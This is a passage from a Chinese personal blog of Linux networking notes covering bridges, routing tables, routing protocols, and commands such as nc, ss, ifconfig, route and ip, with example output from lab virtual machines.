<h2 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h2><p>网桥和交换机都有若干网络接口，交换机网口更多，但两者实现的功能是相同的，都是把这些若干网络接口“连接”起来，在数据链路层对报文进行互相转发，使得连接网口的设备之间能够通信。</p>
<p>“连接”网口并实现报文互相转发的技术就叫桥接，物理的网桥和交换机（以下简称网桥）的网口数量是固定的，而软件模拟的网桥的网口数量是不固定的，因为软件模拟的网桥的网口既可以指定物理网口，也可以指定虚拟网口，物理网口对外连接交换机，虚拟网口对内连接虚拟机。</p>
<p>例如：一台服务器有 4 个网口（可能是四张网卡，每张一个网口，也可能是一张网卡有四个网口）、系统中安装了 5 个虚拟机。使用软件网桥把 2 个物理网口和 3 个虚拟网口桥接在一起，每个虚拟网口连接一个虚拟机。这样，从这两个网口中过来的报文只能转发到这个三个虚拟机中，不会影响到其他虚拟机。</p>
<p>实验一：环境 vmware，三台虚拟机 A、B、C，A 是仅主机模式，C 是 nat 模式，所以 AC 之间不能通信，B 配置两张网卡，一张仅主机，一张 nat，所以 B 既能和 A 通信，也能和 C 通信，所以让 B 充当网桥，把 A 和 C 桥接在一起，从而实现 AC 通信。实现方式可以安装 bridge-utils，也可以使用 nmcli 命令。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"></code></pre>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E8%B7%AF%E7%94%B1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E8%B7%AF%E7%94%B1/" class="post-title-link" itemprop="url">路由</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-01 22:46:38" itemprop="dateCreated datePublished" datetime="2021-01-01T22:46:38+08:00">2021-01-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">基础</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>路由记录了整个网络通讯的路径，路由如果出错，网络肯定不通</p>
<p>路由表主要构成：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 network-scripts<span class="token punctuation">]</span><span class="token comment">#route -n</span>
Kernel IP routing table
Destination     Gateway         Genmask         Flags 	Metric 	Ref    Use Iface
<span class="token number">0.0</span>.0.0         <span class="token number">10.0</span>.0.2        <span class="token number">0.0</span>.0.0         UG    	<span class="token number">100</span>    	<span class="token number">0</span>        <span class="token number">0</span> ens33
<span class="token number">10.0</span>.0.0        <span class="token number">0.0</span>.0.0         <span class="token number">255.255</span>.255.0   U     	<span class="token number">100</span>    	<span class="token number">0</span>        <span class="token number">0</span> ens33
<span class="token number">10.0</span>.0.0        <span class="token number">0.0</span>.0.0         <span class="token number">255.255</span>.255.0   U     	<span class="token number">101</span>    	<span class="token number">0</span>        <span class="token number">0</span> ens37</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">- Destination <span class="token comment"># 目标网络的IP，需要配合Genmask</span>
- Gateway     <span class="token comment"># 网关</span>
                <span class="token comment"># 目标网络直达，gateway是0.0.0.0，通过广播通信</span>
                <span class="token comment"># 目标网络非直达，gateway是相邻（下一跳）路由器的靠近本机的接口IP地址</span>
                    <span class="token comment"># 要和本机在同一网段，不同网段是不能通信的</span>
                    <span class="token comment"># 要先有一条能到达网关地址的路由</span>
- Genmask     <span class="token comment"># 目标网络的子网掩码</span>
                <span class="token comment"># 0.0.0.0/0 表示所有未知网络，又称为默认路由，优先级最低，我称之为兜底路由</span>
                <span class="token comment"># x.x.x.x/32 是主机路由，一般不写这么具体</span>
- Flags       <span class="token comment"># 路由标记</span>
                <span class="token comment"># U：该路由可以使用</span>
                <span class="token comment"># G：该路由是到一个网关(路由器). 若没有此标志, 说明目的地址为直接连接的</span>
                <span class="token comment"># H：该路由是到一个主机，如果没有该标志, 说明该路由是到一个网络</span>
                <span class="token comment"># D：该路由是有重定向报文创建的</span>
                <span class="token comment"># M：该路由已被重定向报文修改</span>
- Metric      <span class="token comment"># 路由开销，值越小，路由记录的优先级最高</span>
- Ref         <span class="token comment">#</span>
- Use Iface   <span class="token comment"># 网卡接口</span></code></pre>

<h2 id="配置动态路由"><a href="#配置动态路由" class="headerlink" title="配置动态路由"></a>配置动态路由</h2><p>route 命令可以添加路由，可是靠手动一条一条的添加太麻烦了，大型的网络环境中，路由器中的路由不是手动添加的，而是通过路由协议自动生成的。</p>
<p>路由协议：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">RIP     <span class="token comment"># Routing Information Protocol，路由信息协议</span>
OSPF    <span class="token comment"># Open Shortest Path First，开放式最短路径优先</span>
BGP     <span class="token comment"># Border Gateway Protocol，边界网关协议</span></code></pre>

<p>大概的过程：每个路由器向网络中广播，告诉其他路由器自己连接的网段，互通有无。例如 pc1 要和 pc2 通信，pc1 只要知道 gwA 能连接 pc1，gwA 只知道 gwB 能连接 pc1，而 gwB 只知道 gwC 能连接 pc1，就这样，最后通过 gwE 才真正连接到 pc2</p>
<p>不同的协议决定了路由器选择路径的算法不同。RIP 很少用，<strong>OSPF 用于局域网，BGP 用于互联网</strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">网络相关命令</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-01 22:45:21" itemprop="dateCreated datePublished" datetime="2021-01-01T22:45:21+08:00">2021-01-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">基础</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>netcat，命令 nc 或 ncat，功能强大的网络工具，网络界的瑞士军刀</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ncat<span class="token operator">|</span><span class="token function">nc</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">..</span>.<span class="token punctuation">]</span> <span class="token punctuation">[</span>hostname<span class="token punctuation">]</span> <span class="token punctuation">[</span>port<span class="token punctuation">]</span>

<span class="token parameter variable">-l</span> port    <span class="token comment"># 启动一个服务器，监听端口号，不能监听已经被占用的端口号</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># hostname -I</span>
<span class="token number">10.0</span>.0.100
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># nc -l 9501	# 建立服务端，监听本机的9501端口号</span>
hello

<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment"># nc 10.0.0.100 9501	# 建立客户端，给10.0.0.100 9501发消息</span>
hello</code></pre>

<h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><p>ss 命令用于显示网络状态，利用 ss 可以让你得知整个 Linux 的网络情况</p>
<p>ss 来自于 iproute 包，代替 netstat，netstat 通过遍历 <code>/proc</code>来获取 socket 信息，主要是<code>/proc/net/tcp</code> 和 <code>/proc/net/tcp6</code> ，ss 使用 netlink 与内核 tcp_diag 模块通信获取 socket 信息，更加高效</p>
<p>一般来说，网络套接字是由 IP 地址，传输协议和端口来定义的。不过需要说明的是套接字不是连接本身，而是连接的端点之一</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ss <span class="token punctuation">[</span> OPTIONS <span class="token punctuation">]</span> <span class="token punctuation">[</span> FILTER <span class="token punctuation">]</span></code></pre>

<p>默认情况下，如果我们运行<code>ss</code>命令而没有指定其他选项，它将显示所有已建立连接的打开的非侦听套接字的列表</p>
<p><strong>OPTIONS：</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-t</span>    <span class="token comment"># 只显示TCP套接字。当与$(-l)结合只打印出监听套接字时，我们可以看到所有在TCP上侦听的内容。</span>
<span class="token parameter variable">-u</span>    <span class="token comment"># 仅显示UDP套接字。由于UDP是一种无连接的协议，因此只运行$(-u)选项将不显示输出，我们可以将它与$(-a)或$(-l)选项结合使用，来查看所有侦听UDP套接字</span>
<span class="token parameter variable">-w</span>    <span class="token comment"># 裸套接字相关</span>
<span class="token parameter variable">-x</span>    <span class="token comment"># unix sock相关</span>
<span class="token parameter variable">-l</span>    <span class="token comment"># 列出当前正在被监听的套接字</span>
<span class="token parameter variable">-a</span>    <span class="token comment"># 不加l参数和加l参数的合集</span>
<span class="token parameter variable">-n</span>    <span class="token comment"># 数字格式</span>
<span class="token parameter variable">-p</span>    <span class="token comment"># 相关的程序及PID</span>
<span class="token parameter variable">-e</span>    <span class="token comment"># 扩展的信息</span>
<span class="token parameter variable">-m</span>    <span class="token comment"># 内存用量</span>
<span class="token parameter variable">-o</span>    <span class="token comment"># 计时器信息</span></code></pre>

<p>-l 示例：查看已经被使用的端口，使用 nc -l 尝试监听 9501 端口，报错提示已经被占用了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@4710419222 ~<span class="token punctuation">]</span><span class="token comment"># ss -ntl</span>
State      Recv-Q Send-Q       Local Address:Port       Peer Address:Port
LISTEN     <span class="token number">0</span>      <span class="token number">511</span>              <span class="token number">127.0</span>.0.1:6379                  *:*
LISTEN     <span class="token number">0</span>      <span class="token number">128</span>                      *:111                   *:*
LISTEN     <span class="token number">0</span>      <span class="token number">511</span>                      *:80                    *:*
LISTEN     <span class="token number">0</span>      <span class="token number">128</span>                      *:46837                 *:*
LISTEN     <span class="token number">0</span>      <span class="token number">128</span>                      *:22                    *:*
LISTEN     <span class="token number">0</span>      <span class="token number">511</span>                      *:443                   *:*
LISTEN     <span class="token number">0</span>      <span class="token number">512</span>                      *:9501                  *:*
LISTEN     <span class="token number">0</span>      <span class="token number">512</span>                      *:9502                  *:*
LISTEN     <span class="token number">0</span>      <span class="token number">511</span>                      *:8000                  *:*
LISTEN     <span class="token number">0</span>      <span class="token number">300</span>                      *:3306                  *:*
LISTEN     <span class="token number">0</span>      <span class="token number">7</span>                        *:3690                  *:*
LISTEN     <span class="token number">0</span>      <span class="token number">128</span>                     :::111                  :::*
LISTEN     <span class="token number">0</span>      <span class="token number">128</span>                     :::58750                :::*
<span class="token punctuation">[</span>root@4710419222 ~<span class="token punctuation">]</span><span class="token comment"># nc -l 9501</span>
Ncat: <span class="token builtin class-name">bind</span> to <span class="token number">0.0</span>.0.0:9501: Address already <span class="token keyword">in</span> use. QUITTING.</code></pre>

<p><strong>FILTER</strong></p>
<p>FILTER : [ state TCP-STATE ] [ EXPRESSION ]</p>
<p><strong>state TCP-STATE：</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">LISTEN       <span class="token comment"># 监听</span>
ESTABLISHED  <span class="token comment"># 已建立的连接</span>
FIN_WAIT_1
FIN_WAIT_2
SYN_SENT
SYN_RECV
CLOSED</code></pre>

<p><strong>EXPRESSION ：</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">dport <span class="token operator">=</span>
sport <span class="token operator">=</span></code></pre>

<p>常用组合：<code>-nt</code> <code>-ntl</code> <code>-nta</code> <code>-ntal</code> <code>-ntalp</code> <code>-ntlp</code> <code>-nua</code> <code>-ntu</code> <code>-ntul</code></p>
<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ss <span class="token parameter variable">-l</span>                                                        <span class="token comment">#显示本地打开的所有端口</span>
ss <span class="token parameter variable">-pl</span>                                                       <span class="token comment">#显示每个进程具体打开的socket</span>
ss <span class="token parameter variable">-t</span> <span class="token parameter variable">-a</span>                                                     <span class="token comment">#显示所有tcp socket</span>
ss <span class="token parameter variable">-u</span> <span class="token parameter variable">-a</span>                                                     <span class="token comment">#显示所有的UDP Socekt</span>
ss <span class="token parameter variable">-o</span> state established <span class="token string">'( dport = :ssh or sport = :ssh )'</span>   <span class="token comment">#显示所有已建立的ssh连接</span>
ss <span class="token parameter variable">-o</span> state established <span class="token string">'( dport = :http or sport = :http )'</span> <span class="token comment">#显示所有已建立的HTTP连接</span>
ss <span class="token parameter variable">-s</span>                                                        <span class="token comment">#列出当前socket详细信息</span>


<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#ss -no state established '( dport = :21 or sport = :21 )'</span>
Netid   Recv-Q   Send-Q      Local Address:Port        Peer Address:Port
tcp      <span class="token number">0</span>         <span class="token number">0</span>         <span class="token punctuation">[</span>::ffff:10.0.0.8<span class="token punctuation">]</span>:21      <span class="token punctuation">[</span>::ffff:10.0.0.7<span class="token punctuation">]</span>:46638  timer:<span class="token punctuation">(</span>keepalive,119min,0<span class="token punctuation">)</span></code></pre>

<h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><p>interface config 接口配置，ifconfig 命令用于<strong>显示</strong>或<strong>设置</strong>网络设备。 来自于 net-tools 包，建议使用 ip 代替</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-a</span>    <span class="token comment"># 显示全部接口信息，包括已经被禁用的网卡</span>
<span class="token parameter variable">-s</span>    <span class="token comment"># 示摘要信息（类似于 netstat -i）</span>
up    <span class="token comment"># 启用网卡，调用的是/usr/sbin/ifup脚本</span>
down  <span class="token comment"># 禁用网卡，调用的是/usr/sbin/ifdown脚本</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifconfig</span> <span class="token parameter variable">-s</span> ens33</code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#清除eth0上面的IP地址</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#ifconfig eth0 0.0.0.0</span>

<span class="token comment">#启用和禁用网卡</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#ifconfig eth0 down</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#ifconfig eth0 up</span>

<span class="token comment">#对一个网卡设置多个IP地址</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#ifconfig eth0:1 172.16.0.8/24</span></code></pre>

<h2 id="NetworkManager"><a href="#NetworkManager" class="headerlink" title="NetworkManager"></a>NetworkManager</h2><h2 id="chkconfig"><a href="#chkconfig" class="headerlink" title="chkconfig"></a>chkconfig</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chkconfig</span> <span class="token punctuation">[</span>--list<span class="token punctuation">]</span> <span class="token punctuation">[</span>--type <span class="token operator">&lt;</span>type<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>name<span class="token punctuation">]</span>
<span class="token function">chkconfig</span> <span class="token parameter variable">--add</span> <span class="token operator">&lt;</span>name<span class="token operator">></span>
<span class="token function">chkconfig</span> <span class="token parameter variable">--del</span> <span class="token operator">&lt;</span>name<span class="token operator">></span>
<span class="token function">chkconfig</span> <span class="token parameter variable">--override</span> <span class="token operator">&lt;</span>name<span class="token operator">></span>
<span class="token function">chkconfig</span> <span class="token punctuation">[</span>--level <span class="token operator">&lt;</span>levels<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--type <span class="token operator">&lt;</span>type<span class="token operator">></span><span class="token punctuation">]</span> <span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token operator">&lt;</span>on<span class="token operator">|</span>off<span class="token operator">|</span>reset<span class="token operator">|</span>resetpriorities<span class="token operator">></span></code></pre>

<p>维护&#x2F;etc&#x2F;rc[0-6].d 目录，可以看到目录下都链接文件，有 K 开头和 S 开头，K 开头需要传入 stop 参数，S 开头需要传入 start 参数。init 进程有 0-6 种等级，init 会执行对应 rc 目录下的所有脚本，例如：init0 关机，会执行 rc0.d 目录下的所有脚本，所以可以看到 rc0.d 目录下全都是 K 开头的文件。</p>
<p>init1-5 开机自启，init0、6 关机自动运行。所以可以把管理脚本放到&#x2F;etc&#x2F;rc.d&#x2F;init.d 目录下，然后在 rc[0-6].d 目录下按照一定的命名规范创建软连接即可。chkconfig 命令可以帮我们实现创建、修改、删除等管理软连接的操作，从而实现开机自启、关机自动关闭等功能。</p>
<ul>
<li>–add：在 rc[0-6].d 下创建对应链接文件，rc[016].d 下是 K 开头，rc[2-5].d 下是 S 开头</li>
<li>–del：删除 rc[0-6].d 下对应的链接文件</li>
<li>–list：列出 chkconfig 管理的所有服务</li>
<li>on：修改 rc[0-6].d 下对应链接文件，rc[016].d 下是 K 开头，rc[2-5].d 下是 S 开头。如果没有则创建</li>
<li>off：修改 rc[0-6].d 下对应链接文件为 K 开头。如果没有则创建</li>
</ul>
<p>chkconfig 适用于 CentOS6，CentOS7 也可以用，但是不推荐，CentOS8 下的 chkconfig 实际上是调用 systemctl</p>
<p>CentOS7、8 推荐使用 systemctl</p>
<h2 id="service-和-systemctl"><a href="#service-和-systemctl" class="headerlink" title="service 和 systemctl"></a>service 和 systemctl</h2><p>Linux 服务管理两种方式 service 和 systemctl ，service 配合 init，systemctl 配合 systemd。centos7、8 中的 init 被重定向到 systemd</p>
<h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>service 命令其实是去&#x2F;etc&#x2F;init.d 目录下，去执行相关程序</p>
<h3 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h3><p>systemctl 集合了 service 和 chkconfig 的所有功能，在 CentOS8 下使用这俩命令实际上是间接调用 systemctl</p>
<h3 id="unit"><a href="#unit" class="headerlink" title="unit"></a>unit</h3><p>单元，systemd 中的一个概念，系统初始化需要做的事情非常多。需要启动后台服务，比如启动 <code>ssh</code> 服务；需要做配置工作，比如挂载文件系统。这个过程中的每一步都被 <code>systemd</code> 抽象为一个配置单元，即 <code>unit</code>。可以认为一个服务是一个配置单元，一个挂载点是一个配置单元，一个交换分区的配置是一个配置单元等等。<code>systemd</code> 将配置单元归纳为以下一些不同的类型。然而，<code>systemd</code> 正在快速发展，新功能不断增加。所以配置单元类型可能在不久的将来继续增加。下面是几个常见的 unit 类型：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">- <span class="token function">service</span>    <span class="token comment"># 代表一个后台服务进程，这个最多的</span>
- target
- wants
- socket
- <span class="token function">mount</span>
- slice
- path
- timer</code></pre>

<p>配置单元的目录：<code>/usr/lib/systemd/system</code></p>
<h2 id="route"><a href="#route" class="headerlink" title="route"></a>route</h2><p>路由表管理命令</p>
<h3 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h3><pre class="language-bash" data-language="bash"><code class="language-bash">route
route <span class="token parameter variable">-n</span>

<span class="token parameter variable">-n</span>  <span class="token comment"># 以数字形式代替解释主机名形式来显示地址。此项对试图检测对域名服务器进行路由发生故障的原因非常有用</span></code></pre>

<h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><pre class="language-bash" data-language="bash"><code class="language-bash">route <span class="token function">add</span> <span class="token punctuation">[</span>-net<span class="token operator">|</span>-host<span class="token operator">|</span>default<span class="token punctuation">]</span> <span class="token operator">&lt;</span>TARGET<span class="token operator">></span> <span class="token punctuation">[</span>netmask Nm<span class="token punctuation">]</span> <span class="token punctuation">[</span>gw <span class="token operator">&lt;</span>GW<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>dev<span class="token punctuation">]</span> <span class="token operator">&lt;</span>If<span class="token operator">></span><span class="token punctuation">]</span>

<span class="token parameter variable">-net</span>    <span class="token comment"># 目标地址是网段</span>
<span class="token parameter variable">-host</span>   <span class="token comment"># 目标地址是主机，一般不添加这种路由</span>
default <span class="token comment"># 默认，目标地址0.0.0.0</span>
target  <span class="token comment"># 目标网络，可以用CIDR表示法，也可以写子网掩码，推荐前者</span>
gw      <span class="token comment"># 网关</span>
dev     <span class="token comment"># 本机接口，指定从哪个接口往目标网络发送请求，这个参数一般会忽略不写，因为通过网关和目标地址会自动判断。网关不为0.0.0.0，则这个本机接口和网关IP在同一网段；网关0.0.0.0，说明目标ip和本机ip在同一网段，那这个本机接口就和目标地址的ip在同一网段</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#route add -net 172.18.0.0/16 gw 10.0.0.100 dev ens33</span>
<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#route -n</span>
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
<span class="token number">0.0</span>.0.0         <span class="token number">10.0</span>.0.2        <span class="token number">0.0</span>.0.0         UG    <span class="token number">100</span>    <span class="token number">0</span>        <span class="token number">0</span> ens33
<span class="token number">10.0</span>.0.0        <span class="token number">0.0</span>.0.0         <span class="token number">255.255</span>.255.0   U     <span class="token number">100</span>    <span class="token number">0</span>        <span class="token number">0</span> ens33
<span class="token number">10.0</span>.0.0        <span class="token number">0.0</span>.0.0         <span class="token number">255.255</span>.255.0   U     <span class="token number">101</span>    <span class="token number">0</span>        <span class="token number">0</span> ens37
<span class="token number">172.18</span>.0.0      <span class="token number">10.0</span>.0.100      <span class="token number">255.255</span>.0.0     UG    <span class="token number">0</span>      <span class="token number">0</span>        <span class="token number">0</span> ens33</code></pre>

<h3 id="删除路由"><a href="#删除路由" class="headerlink" title="删除路由"></a>删除路由</h3><p>怎添加就怎么删除</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">route del <span class="token punctuation">[</span>-net<span class="token operator">|</span>-host<span class="token punctuation">]</span> target <span class="token punctuation">[</span>gw Gw<span class="token punctuation">]</span> <span class="token punctuation">[</span>netmask Nm<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>dev<span class="token punctuation">]</span> If<span class="token punctuation">]</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#route del -net 172.18.0.0/16 gw 10.0.0.100 dev ens33</span>
<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#route -n</span>
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
<span class="token number">0.0</span>.0.0         <span class="token number">10.0</span>.0.2        <span class="token number">0.0</span>.0.0         UG    <span class="token number">100</span>    <span class="token number">0</span>        <span class="token number">0</span> ens33
<span class="token number">10.0</span>.0.0        <span class="token number">0.0</span>.0.0         <span class="token number">255.255</span>.255.0   U     <span class="token number">100</span>    <span class="token number">0</span>        <span class="token number">0</span> ens33
<span class="token number">10.0</span>.0.0        <span class="token number">0.0</span>.0.0         <span class="token number">255.255</span>.255.0   U     <span class="token number">101</span>    <span class="token number">0</span>        <span class="token number">0</span> ens37</code></pre>

<h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>来自于 iproute 包，集合了 ifconfig 和 route 的所有功能，官方推荐使用 <code>ip address</code> 和 <code>ip link</code> 代替 <code>ifconfig</code> 命令；使用 <code>ip route</code> 代替 <code>route</code> 命令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ip</span> <span class="token punctuation">[</span> OPTIONS <span class="token punctuation">]</span> OBJECT <span class="token punctuation">&#123;</span> COMMAND <span class="token operator">|</span> <span class="token builtin class-name">help</span> <span class="token punctuation">&#125;</span></code></pre>

<h3 id="ip-地址管理"><a href="#ip-地址管理" class="headerlink" title="ip 地址管理"></a>ip 地址管理</h3><p>给网卡 添加 | 删除 ip</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ip</span> address <span class="token punctuation">&#123;</span> <span class="token function">add</span> <span class="token operator">|</span> del <span class="token punctuation">&#125;</span> IFADDR dev STRING <span class="token punctuation">[</span>label LABEL<span class="token punctuation">]</span> <span class="token punctuation">[</span>scope <span class="token punctuation">&#123;</span>global<span class="token operator">|</span><span class="token function">link</span><span class="token operator">|</span>host<span class="token punctuation">&#125;</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>broadcast ADDRESS<span class="token punctuation">]</span>

label     <span class="token comment">#网卡别名</span>
scope     <span class="token comment">#指明作用域，global 全局可用、link 仅链接可用（必须绑定网卡，只有绑定的网口近来的请求可以相应）、host 本机可用</span>
broadcast <span class="token comment">#指明广播地址</span></code></pre>

<p>address 可以简写为 addr 甚至 a 都可以</p>
<p>示例：给 ens37 网卡添加 ip</p>
<p>ens37 网卡初始状态 <code>ip address show dev ens37</code><br><img data-src="//img.to2b.cn/blog/ljk/1598585405097.png"></p>
<p>给 ens37 添加 ip：11.0.0.120&#x2F;24 <code>ip address add 11.0.0.120/24 dev ens37</code><br><img data-src="//img.to2b.cn/blog/ljk/1598585535013.png"></p>
<p>给 ens37 添加 ip：11.0.0.130&#x2F;24 同时设置别名 <code>ip address add 11.0.0.130/24 dev ens37 label ens37:1</code><br><img data-src="//img.to2b.cn/blog/ljk/1598585633138.png"></p>
<p>示例：删除 ens37 网卡的 ip</p>
